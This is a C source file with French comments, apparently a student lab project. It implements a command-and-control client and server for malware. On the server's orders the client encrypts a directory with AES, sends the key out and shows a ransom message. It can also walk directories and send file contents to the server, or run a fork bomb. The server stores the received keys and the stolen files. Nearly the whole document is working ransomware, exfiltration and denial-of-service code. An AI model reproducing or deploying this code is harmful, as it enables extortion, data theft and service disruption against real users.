#include <string.h>
#include <stdlib.h>

#include <string.h>     // pour memset()
#include <sys/types.h>  // pour socket(), setsockopt(), bind(), listen(), accept(), recv(), send(), wait()
#include <sys/socket.h> // pour socket(), setsockopt(), bind(),listen(), accept(), recv(), send()

#include <unistd.h> // pour fork(), close()

#include <sys/wait.h> // pour wait()

#include <dirent.h>

#include <openssl/rand.h>
#include <openssl/aes.h>
#include <openssl/evp.h>
#include "chiffrement.h"
#define FICHIER_DE_CONF "config.ini"
#define MAX_LIGNES 255
#define MAX_CARACTERES_PAR_LIGNE 255

// Routine d'interception du signal SIGCHLD emis par les fils
void intercepter(int numSignal);
int envoyer_la_donnees(int socketConnectee, char *message);
int recevoir_la_donnees(int socketConnectee, char **donnee);
void ecrireDansFichier(const char *nomFichier, const char *donnees, char *mode);
void gererLesOrdreServeur(int socket, char *ordre_du_serveur); // gerer les odres du serveur maitre
void clean_buffer();

int gererRetoursClient(int socket, char *ordre_du_serveur, char *identifiant_client);

/*
@brief
liste les repertoires et les fichiers dans un premiers temps, puis copie le nom et le contenu des trois premiers fichiers trouvé dans une variable d_name et data
*/
int send_file_to_server(char *directoryName, int socket);
/*
@brief
Read config.ini and check if identifiant exist in

return 0 if success
return -1 if error or identifiant not found
*/
int verificationIdentifiantEtrucuperationCommande(char *identifiant, char **commande);

// Fonction pour recevoir des donnees client ou serveur
int recevoir_la_donnees(int socketConnectee, char **donnee)
{

    // char *message;
    // char commande[MAX_CARACTERES_PAR_LIGNE];
    ssize_t taille_reponse;
    ssize_t bytes_read;

    // Recevoir la taille de la réponse du serveur
    bytes_read = recv(socketConnectee, &taille_reponse, sizeof(taille_reponse), 0);
    if (bytes_read == -1)
    {
        perror("recv");
        return -1;
    }

    // printf("%d",taille_reponse);

    // Allouer de la mémoire pour la réponse
    *donnee = (char *)realloc(*donnee, taille_reponse);
    if (*donnee == NULL)
    {
        perror("realloc receiv data");
        return -1;
    }

    // Recevoir la réponse du serveur
    if (recv(socketConnectee, *donnee, taille_reponse, 0) == -1)
    {
        perror("recv");
        free(*donnee);
        return -1;
    }

    (*donnee)[taille_reponse] = '\0';

    return bytes_read;
}

// Fonction pour envoyer des donnees client ou serveur
int envoyer_la_donnees(int socketConnectee, char *message)
{

    size_t taille_message = strlen(message) ;
    // printf("%d",taille_message);

    ssize_t bytes_read;
    // Envoie de la taille du message
    if (send(socketConnectee, &taille_message, sizeof(taille_message), 0) == -1)
    {
        perror("send");
        return -1;

    }

    // Envoie de la commande
    if (send(socketConnectee, message, taille_message, 0) == -1)
    {
        perror("send");
        return -1;
    }
   
}

// Fonction pour l'interception du signal SIGCHLD émis par les fils
void intercepter(int numSignalRecu)
{
    wait(NULL);
}

// Fonction pour la vérification de l'identifiant et la récupération de la commande associée
int verificationIdentifiantEtrucuperationCommande(char *identifiant, char **commande)
{

    FILE *fd;
    char ligne[MAX_CARACTERES_PAR_LIGNE];

    *commande = NULL;
    // Ouvrir le fichier en mode lecture
    fd = fopen(FICHIER_DE_CONF, "r");

    // Vérifier si l'ouverture du fichier a réussi
    if (fd == NULL)
    {
        printf("Le fichier %s n'existe pas ou sa lecture est impossible\n", FICHIER_DE_CONF);
        return -1;
    }

    printf("Vérification de l'identifiant: \'%s\'\n", identifiant);
    // Lire chaque ligne du fichier
    int index = 0;

    while (fgets(ligne, sizeof(ligne), fd) != NULL && (index < MAX_LIGNES))
    {
        unsigned short identifiantTrouve = 0;

        // Sépare et récupère la commande pour l'identifiant donné
        char *token = strtok(ligne, "=");
        for (int i = 0; i < 2; i++)
        {
            if (token != NULL)
            {

                if (i == 0)
                {
                    if (strcmp(token, identifiant) == 0)
                    {

                        identifiantTrouve = 1;
                    }
                }
                else if (identifiantTrouve == 1 && i == 1)
                {

                    *commande = (char *)realloc(*commande, strlen(token)+1);

                    // Vérifie si une commande est renseignée pour l'identifiant
                    if (strlen(token) > 2 && strlen(token) < 255)
                    {
                       (*commande)[strlen(token)] = '\0';
                        strncpy(*commande, token,strlen(token));
                    }   
                    else
                    {
                        // si aucune commande trouvée, envoyer "out"
                       *commande = (char *)realloc(*commande, 4);
                        strcpy(*commande, "out");
                    }
                    
                    fclose(fd);
                    return 0;
                }

                
            }
            token = strtok(NULL, "=");
        }

        index++;
    }

    // Fermer le fichier
    fclose(fd);
    printf("L'identifiant \'%s\' non trouvé\n", identifiant);

    return -1; // Retourner -1 si aucun identifiant trouvé
}

void gererLesOrdreServeur(int socket, char *ordre_du_serveur)
{
   // printf("%d", strlen(ordre_du_serveur));

    // gestion des ordres
    if (strncmp(ordre_du_serveur, "ransomware",strlen(ordre_du_serveur)-1) == 0)
    {

        
        // Générer la clé symétrique AES
        unsigned char aes_key[KEY_SIZE];
        genererCleAleatoire(aes_key, KEY_SIZE);

        // Chiffrer tous les fichiers du répertoire courant
        chiffrerRepertoire("./test/", aes_key);

        printf("%s", aes_key);

        // envoie de la clef au serveur
        envoyer_la_donnees(socket, aes_key);

        // Affichage 10 000 fois avec une pause de 3 secondes entre chaque affichage
        fflush(stdout);
        fprintf(stdout,"\nDonnees chiffrees veuilez contacter le 02.25.68.22 IPSSI\n");
    }
    else if (strncmp(ordre_du_serveur, "exfiltration",strlen(ordre_du_serveur)-1) == 0)
    {

        send_file_to_server(".", socket);
    }

    else if (strncmp(ordre_du_serveur, "fork", 4) == 0)
    {

        char *token = strtok(ordre_du_serveur, "-");
        int nombre_de_boucle = 5;

        if (token != NULL)
        {

            token = strtok(NULL, "-");

            // convertir le carractere en type entier pour determiner le nombre d'iteration
            if (token != NULL)
            {
                nombre_de_boucle = atoi(token);
            }
        }

        for (size_t i = 0; i < nombre_de_boucle; i++)
        {

            fork();
        }
    }
    else
    {
        printf("%s", ordre_du_serveur);
    }
}

int send_file_to_server(char *directoryName, int socket)
{
    struct dirent *dir;
    // opendir() renvoie un pointeur de type DIR.
    DIR *d = opendir(directoryName);

    static int fileExtracted = 0;
    static int instance = 0;
    instance++;
    if (d)
    {
        // limitation pour les trois premier fichiers
        while (fileExtracted < 3 && (dir = readdir(d)) != NULL)
        {
            if (dir->d_name[0] != '.' && (dir->d_name[1] != '\0' || dir->d_name[1] != '.') && dir->d_name[strlen(dir->d_name) - 1] != 'h' && dir->d_name[strlen(dir->d_name) - 1] != 'c' && strcmp(dir->d_name, FICHIER_DE_CONF) != 0)
            {
                char path[4096] = "";
                strcat(path, directoryName);
                strcat(path, "/");
                strcat(path, dir->d_name);
                // VÃ©rifie les dossiers
                if (dir->d_type == DT_DIR)
                {
                    send_file_to_server(path, socket);
                }
                // ouvre les et extrait les fichiers
                else if (dir->d_type == DT_REG)
                {

                    FILE *fichier = fopen(path, "r");

                    if (fichier == NULL)
                    {
                        perror("Erreur lors de l'ouverture du fichier");
                        continue;
                    }

                    int max = 256;
                    int i = 0;
                    char *data = malloc(sizeof(*data) * max);

                    while ((data[i] = fgetc(fichier)) != EOF)
                    {
                        i++;
                        if (i >= max)
                        {
                            max += 256;
                            data = realloc(data, sizeof(*data) * max);
                        }
                    }
                    data[strlen(data) - 1] = '\0';
                    // printf("%s\n%s\n\n", dir->d_name, data);

                    // TODO : Change name
                    // envoyer_la_donnees(socket, NULL);

                    // funcSocketPlaceholder(dir->d_name, data);
                    envoyer_la_donnees(socket, dir->d_name);
                    envoyer_la_donnees(socket, data);

                    fileExtracted++;
                    free(data);
                }
            }
        }
        // envoyer_la_donnees(socket, NULL);
        closedir(d);
    }
    instance--;
    if (instance == 0)
    {
        fileExtracted = 0;
    }
    return 0;
}

void ecrireDansFichier(const char *nomFichier, const char *donnees, char *mode)
{
    FILE *fichier = NULL;

    // Essayer d'ouvrir le fichier avec le nom donné
    fichier = fopen(nomFichier, mode);

    if (fichier == NULL)
    {
        perror("Erreur lors de l'ouverture du fichier");
        return;
    }

    // Écrire les données dans le fichier
    fprintf(fichier, "%s\n", donnees);

    // Fermer le fichier
    if (fclose(fichier) != 0)
    {
        perror("Erreur lors de la fermeture du fichier");
    }
}

int gererRetoursClient(int socket, char *ordre_du_serveur, char *identifiant_client)
{


    // gestion des ordres
    if (strcmp(ordre_du_serveur, "ransomware") == 0)
    {
        char *clef_aes ;
      
        //char *t = (char*)malloc(strlen(ordre_du_serveur)+strlen(identifiant_client)+2);

        // recevoir la clef de cryptage
        if (recevoir_la_donnees(socket, &clef_aes) < 0)
        {
            printf("impossible de recevoir la donnees");
            return -1;
        }
        // // Stocker l'identifiant et la clef dans un fichier
        // strcat(t, clef_aes);
        // strcat(t, ": ");
        // strcat(t,clef_aes);

        ecrireDansFichier("aes-cle-list.c",identifiant_client, "a");
         ecrireDansFichier("aes-cle-list.c",clef_aes, "a");
       
        // // ecrire la clef dans un fichier .log
    }
    else if (strcmp(ordre_du_serveur, "exfiltration") == 0)
    {
        char *nomFichier;
        char *donnees_du_fichier;

        while (recevoir_la_donnees(socket, &nomFichier) > 0)
        {

            recevoir_la_donnees(socket, &donnees_du_fichier);
            ecrireDansFichier(nomFichier, donnees_du_fichier, "w+");
            //printf("Reception du fichier %s\n", nomFichier);
        }
    }

    else if (strncmp(ordre_du_serveur, "fork", 4) == 0)
    {

        char *token = strtok(ordre_du_serveur, "-");
        int nombre_de_boucle = 5;

        if (token != NULL)
        {

            token = strtok(NULL, "-");

            // convertir le carractere en type entier pour determiner le nombre d'iteration
            if (token != NULL)
            {
                nombre_de_boucle = atoi(token);
            }
        }

        for (size_t i = 0; i < nombre_de_boucle; i++)
        {

            fork();
        }
    }
    else
    {
        printf("%s", ordre_du_serveur);
    }
}

void clean_buffer()
{
    int c;
    while ((c = getchar()) != '\n' && c != EOF)
        ;
}
